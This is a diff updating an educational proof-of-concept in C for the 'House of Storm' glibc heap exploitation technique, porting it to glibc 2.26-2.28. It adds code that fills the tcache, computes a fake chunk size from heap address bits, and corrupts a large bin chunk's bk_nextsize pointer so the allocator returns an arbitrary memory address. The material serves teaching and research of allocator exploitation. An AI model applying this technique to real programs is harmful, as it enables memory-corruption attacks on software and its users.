@@ -1,22 +1,27 @@
 /*
 
-POC for House of Storm on 2.23
+POC for House of Storm on 2.26
 
 For 2.26-2.28, the tcache will need to 
 be full for this to work. After this, 
-a patch to the unsorted bin attack likely prevents this 
-technique from working. 
+a patch to the unsorted bin attack prevents this 
+technique from working.
 
 This technique uses a combination of editing
-the unsorted bin chunk and the large bin chunks
-to write a 'size' to a user choosen address in memory.
+an unsorted bin chunk and a large bin chunk
+to write a 'size' to a user choosen address in memory,
+which will get pulled out from the unsorted bin.
 
 Once this has occurred, if the size at this 'fake' 
 location is the same size as the allocation, 
 then the chunk will be returned back to the user. 
 
 This attack allows arbitrary chunks to be returned
-to the user!
+to the user! This requires the following: 
+- Write on free unsorted bin chunk
+- Write on free large bin chunk
+- Known address of target memory address
+- Known address of upper bits of heap chunk
 
 Written by Maxwell "Strikeout" Dulin
 */
@@ -34,11 +39,26 @@ void init(){
         clearenv();
 }
 
+// Get the AMOUNT to shift over for size and the offset on the largebin.
+// Needs to be a valid minimum sized chunk in order to work.
+int get_shift_amount(char* pointer){
+	
+	int shift_amount = 0;
+	long long ptr = (long long)pointer;	
+	
+	while(ptr > 0x20){
+		ptr = ptr >> 8; 
+		shift_amount += 1; 
+	}	
+
+	return shift_amount - 1; // Want amount PRIOR to this being zeroed out
+}
+
 int main(){
 
 	init();
 
-	char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
+        char *unsorted_bin, *large_bin, *fake_chunk, *ptr;
 	int* tcaches[7];
 
 	puts("House of Storm"); 
@@ -68,30 +88,72 @@ int main(){
 	size, which comes from the upper bytes of the heap address.
 
 	NOTE: 
-	- This does have a 1/2 chance of failing. If the 4th bit 
-	of this value is set, then the size comparison will fail.
-	- Without this calculation, this COULD be brute forced.
+	- This does have a 1/2 chance of failing on the 4th bit. If the 4th bit 
+	of this value is set, then the size comparison will fail everytime.
+	- There is ANOTHER 1/4 chance of this failing (for the demo). Either
+	  the mmap bit needs to be set or the non-main arena cannot be set.
+	- Without these calculations, this COULD be brute forced with relative
+	  overwrites in a leakless fashion.
 	*/
-	size_t alloc_size = ((size_t)unsorted_bin & 0xFFFF0000) >> 16;
+
+	int shift_amount = get_shift_amount(unsorted_bin);	
+	printf("Shift Amount: %d\n", shift_amount); 
+
+	size_t alloc_size = ((size_t)unsorted_bin) >> (8 * shift_amount);
+	if(alloc_size < 0x10){
+		printf("Chunk Size: 0x%lx\n", alloc_size);
+		puts("Chunk size is too small");
+		exit(1);
+	}
 	alloc_size = (alloc_size & 0xFFFFFFFFE) - 0x10; // Remove the size bits
 	printf("In this case, the chunk size is 0x%lx\n", alloc_size);
 
-	// Checks to see if the program will crash or not
-	if((alloc_size & 0xC) != 0){
-		puts("Allocation size has bit 4 of the size set; chunk will not get taken out of unsorted bin.");
-		puts("Please try again! :)");
-		puts("Exiting...");
-		return 1; 
-	}
+        // Checks to see if the program will crash or not
+	/*
+	The fourth bit of the size and the 'non-main arena' chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. 
 
-	puts("Fill TCache of the allocation size amount");
-	puts("Done to prevent usage of TCache stashing");
-	// Fill up the TCache for the proper size
-	for(int i = 0; i < 7; i++){
-		tcaches[i] = malloc(alloc_size);
+	Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438
+	validates to see if ONE of the following cases is true: 
+	- av == arena_for_chunk (mem2chunk (mem))
+	- chunk is mmaped
+
+	If the 'non-main arena' bit is set on the chunk, then the 
+	first case will fail. 
+	If the mmap bit is set, then this will pass. 
+	
+	So, either the arenas need to match up (our fake chunk is in the 
+	.bss section for this demo. So, clearly, this will not happen) OR
+	the mmap bit must be set.
+
+	The logic below validates that the fourth bit of the size
+	is NOT set and that either the mmap bit is set or the non-main 
+	arena bit is NOT set. If this is the case, the exploit should work.
+	*/
+        if((alloc_size & 0x8) != 0 || (((alloc_size & 0x4) == 0x4) && ((alloc_size & 0x2) != 0x2))){
+                puts("Allocation size has bit 4 of the size set or ");
+		puts("mmap and non-main arena bit check will fail");
+                puts("Please try again! :)");
+                puts("Exiting...");
+                return 1;
+        }
+
+	// If the chunk would go into the TCache, we need to fill up
+	// the TCache in order to prevent TCache stashing from happening.
+	if(alloc_size < 0x410){
+		puts("Fill TCache of the allocation size amount if the size of the target chunk is a TCache size chunk (0x20-0x410)");
+		puts("Done to prevent usage of TCache stashing");
+
+
+		// Fill up the TCache for the proper size
+		for(int i = 0; i < 7; i++){
+			tcaches[i] = malloc(alloc_size);
+		}
+		for(int i = 0; i < 7; i++){
+			free(tcaches[i]);
+		}
 	}
-	for(int i = 0; i < 7; i++){
-		free(tcaches[i]);
+	else{
+		puts("Not filling up the TCache");
 	}
 
 	large_bin  =  malloc ( 0x4d8 );  // size 0x4e0 
@@ -175,9 +237,12 @@ int main(){
 	from the allocator. 
 
 	Second vulnerability!!!
-	*/
-	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - 2; // large_bin->bk_nextsize
 
+	// The shift amount is used in order to calculate the proper offset
+	to write the chunk size at, depending on the size of the pointer.
+	This depends on the size of the pointer. 
+	*/
+	(( size_t *) large_bin)[3] = (size_t)fake_chunk - 0x18 - shift_amount; // large_bin->bk_nextsize
 
 	/*
 	At this point, we've corrupted everything in just the right 
@@ -188,10 +253,9 @@ int main(){
 	this by using the large bin code to write a size to the 'bk' 
 	location.
 
-	This call to malloc (if you're lucky), will return a pointer
+	This call to calloc, will return a pointer
 	to the fake chunk that we created above. 
 	*/
-
 
 	puts("Make allocation of the size that the value will be written for.");
 	puts("Once the allocation happens, the madness begins"); 
